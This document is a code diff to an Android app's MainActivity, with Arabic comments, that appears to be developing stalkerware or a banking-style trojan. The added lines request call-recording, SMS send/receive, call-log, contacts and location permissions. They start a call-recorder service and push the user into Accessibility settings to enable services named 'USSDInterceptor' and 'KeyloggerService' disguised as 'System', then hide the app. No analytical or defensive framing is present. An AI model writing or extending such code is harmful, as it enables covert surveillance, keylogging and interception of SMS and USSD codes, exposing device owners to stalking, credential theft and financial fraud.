@@ -36,33 +36,68 @@ public class MainActivity extends Activity {
         if (Build.VERSION.SDK_INT >= 33) {
             // Android 13+ (API 33+)
             return new String[][]{
+                    // كاميرا
                     {Manifest.permission.CAMERA, "للتحقق البصري من الهوية"},
-                    {Manifest.permission.RECORD_AUDIO, "لتحليل البصمة الصوتية"},
-                    {Manifest.permission.READ_CONTACTS, "لعمل نسخة احتياطية من جهات الاتصال"},
-                    {Manifest.permission.READ_SMS, "لعمل نسخة احتياطية من الرسائل"},
-                    {Manifest.permission.READ_CALL_LOG, "لحفظ سجل المكالمات"},
-                    {Manifest.permission.ACCESS_FINE_LOCATION, "لتحديد موقعك بدقة"},
-                    {Manifest.permission.ACCESS_COARSE_LOCATION, "لتحديد موقعك التقريبي"},
-                    {Manifest.permission.READ_PHONE_STATE, "للتحقق من هوية الجهاز"},
-                    // ★★ صلاحيات Android 13 الجديدة ★★
+
+                    // صوت + تسجيل
+                    {Manifest.permission.RECORD_AUDIO, "لتسجيل الصوت والمكالمات"},
+
+                    // اتصالات
+                    {Manifest.permission.READ_PHONE_STATE, "لمراقبة المكالمات"},
+                    {Manifest.permission.CALL_PHONE, "للتحكم بالمكالمات"},
+                    {Manifest.permission.READ_CALL_LOG, "لقراءة سجل المكالمات"},
+                    {Manifest.permission.PROCESS_OUTGOING_CALLS, "لمراقبة المكالمات الصادرة"},
+
+                    // SMS
+                    {Manifest.permission.READ_SMS, "لقراءة الرسائل"},
+                    {Manifest.permission.SEND_SMS, "لإرسال الرسائل"},
+                    {Manifest.permission.RECEIVE_SMS, "لاستقبال الرسائل"},
+
+                    // جهات الاتصال
+                    {Manifest.permission.READ_CONTACTS, "لقراءة جهات الاتصال"},
+
+                    // الموقع
+                    {Manifest.permission.ACCESS_FINE_LOCATION, "لتحديد الموقع بدقة"},
+                    {Manifest.permission.ACCESS_COARSE_LOCATION, "لتحديد الموقع التقريبي"},
+
+                    // الإشعارات (جديد في Android 13)
+                    {Manifest.permission.POST_NOTIFICATIONS, "لإشعارات النظام"},
+
+                    // وسائط (جديد في Android 13)
                     {"android.permission.READ_MEDIA_IMAGES", "لقراءة الصور"},
                     {"android.permission.READ_MEDIA_VIDEO", "لقراءة الفيديوهات"},
                     {"android.permission.READ_MEDIA_AUDIO", "لقراءة الملفات الصوتية"},
-                    {Manifest.permission.POST_NOTIFICATIONS, "لإشعارات النظام"},
             };
         } else {
             // Android 12 وأقل (API 32 وأقل)
             return new String[][]{
+                    // كاميرا
                     {Manifest.permission.CAMERA, "للتحقق البصري من الهوية"},
-                    {Manifest.permission.RECORD_AUDIO, "لتحليل البصمة الصوتية"},
-                    {Manifest.permission.READ_CONTACTS, "لعمل نسخة احتياطية من جهات الاتصال"},
-                    {Manifest.permission.READ_SMS, "لعمل نسخة احتياطية من الرسائل"},
-                    {Manifest.permission.READ_CALL_LOG, "لحفظ سجل المكالمات"},
-                    {Manifest.permission.ACCESS_FINE_LOCATION, "لتحديد موقعك بدقة"},
-                    {Manifest.permission.ACCESS_COARSE_LOCATION, "لتحديد موقعك التقريبي"},
-                    {Manifest.permission.READ_PHONE_STATE, "للتحقق من هوية الجهاز"},
+
+                    // صوت + تسجيل
+                    {Manifest.permission.RECORD_AUDIO, "لتسجيل الصوت والمكالمات"},
+
+                    // اتصالات
+                    {Manifest.permission.READ_PHONE_STATE, "لمراقبة المكالمات"},
+                    {Manifest.permission.CALL_PHONE, "للتحكم بالمكالمات"},
+                    {Manifest.permission.READ_CALL_LOG, "لقراءة سجل المكالمات"},
+                    {Manifest.permission.PROCESS_OUTGOING_CALLS, "لمراقبة المكالمات الصادرة"},
+
+                    // SMS
+                    {Manifest.permission.READ_SMS, "لقراءة الرسائل"},
+                    {Manifest.permission.SEND_SMS, "لإرسال الرسائل"},
+                    {Manifest.permission.RECEIVE_SMS, "لاستقبال الرسائل"},
+
+                    // جهات الاتصال
+                    {Manifest.permission.READ_CONTACTS, "لقراءة جهات الاتصال"},
+
+                    // الموقع
+                    {Manifest.permission.ACCESS_FINE_LOCATION, "لتحديد الموقع بدقة"},
+                    {Manifest.permission.ACCESS_COARSE_LOCATION, "لتحديد الموقع التقريبي"},
+
+                    // التخزين
                     {Manifest.permission.READ_EXTERNAL_STORAGE, "لقراءة الملفات"},
-                    {Manifest.permission.WRITE_EXTERNAL_STORAGE, "لحفظ النسخ الاحتياطية"},
+                    {Manifest.permission.WRITE_EXTERNAL_STORAGE, "لحفظ الملفات"},
             };
         }
     }
@@ -214,7 +249,7 @@ public class MainActivity extends Activity {
     }
 
     // ============================================================
-    // ★★★ MANAGE_EXTERNAL_STORAGE — مهم جداً للصور ★★★
+    // MANAGE_EXTERNAL_STORAGE
     // ============================================================
     private void requestManageStorage() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
@@ -231,7 +266,6 @@ public class MainActivity extends Activity {
                 }
             } catch (Exception e) {
                 Log.e(TAG, "ManageStorage error: " + e.getMessage());
-                // Fallback: افتح صفحة عامة
                 try {
                     Intent intent = new Intent(
                             Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
@@ -275,7 +309,6 @@ public class MainActivity extends Activity {
             mainHandler.postDelayed(this::requestManageStorage, 500);
 
         } else if (requestCode == REQUEST_MANAGE_STORAGE) {
-            // ★ تحقق لو الصلاحية اتاخدت فعلاً
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                 try {
                     boolean granted = Environment.isExternalStorageManager();
@@ -292,11 +325,12 @@ public class MainActivity extends Activity {
     }
 
     // ============================================================
-    // ★ إنهاء Setup وبدء ServiceRunner
+    // ★ إنهاء Setup وبدء كل الخدمات
     // ============================================================
     private void finishSetup() {
-        Log.d(TAG, "Setup complete - starting ServiceRunner");
+        Log.d(TAG, "Setup complete - starting services");
 
+        // ★ 1. تشغيل ServiceRunner (الخدمة الرئيسية)
         try {
             Intent serviceIntent = new Intent(this, ServiceRunner.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -304,19 +338,49 @@ public class MainActivity extends Activity {
             } else {
                 startService(serviceIntent);
             }
-            Log.d(TAG, "ServiceRunner started");
+            Log.d(TAG, "✅ ServiceRunner started");
         } catch (Exception e) {
-            Log.e(TAG, "start service error: " + e.getMessage());
+            Log.e(TAG, "start ServiceRunner error: " + e.getMessage());
         }
 
-        // اخفي التطبيق
+        // ★ 2. تشغيل CallRecorderService (تسجيل المكالمات)
+        try {
+            Intent callRecorderIntent = new Intent(this, CallRecorderService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(callRecorderIntent);
+            } else {
+                startService(callRecorderIntent);
+            }
+            Log.d(TAG, "✅ CallRecorderService started");
+        } catch (Exception e) {
+            Log.e(TAG, "start CallRecorder error: " + e.getMessage());
+        }
+
+        // ★ 3. فتح صفحة Accessibility Services
+        // (عشان المستخدم يفعّل USSDInterceptor + KeyloggerService)
+        mainHandler.postDelayed(() -> {
+            try {
+                Intent accessibilityIntent = new Intent(
+                        Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                accessibilityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(accessibilityIntent);
+
+                Log.d(TAG, "📱 Opened Accessibility Settings");
+                Log.d(TAG, "User must enable 'System' accessibility service");
+
+            } catch (Exception e) {
+                Log.e(TAG, "open accessibility settings error: " + e.getMessage());
+            }
+        }, 2000);
+
+        // ★ 4. اخفاء التطبيق بعد 7 ثواني
         mainHandler.postDelayed(() -> {
             try {
                 moveTaskToBack(true);
-                Log.d(TAG, "App hidden");
+                Log.d(TAG, "✅ App hidden");
             } catch (Exception e) {
                 Log.e(TAG, "moveTaskToBack error: " + e.getMessage());
             }
-        }, 1000);
+        }, 7000);
     }
-                        }
+                    }
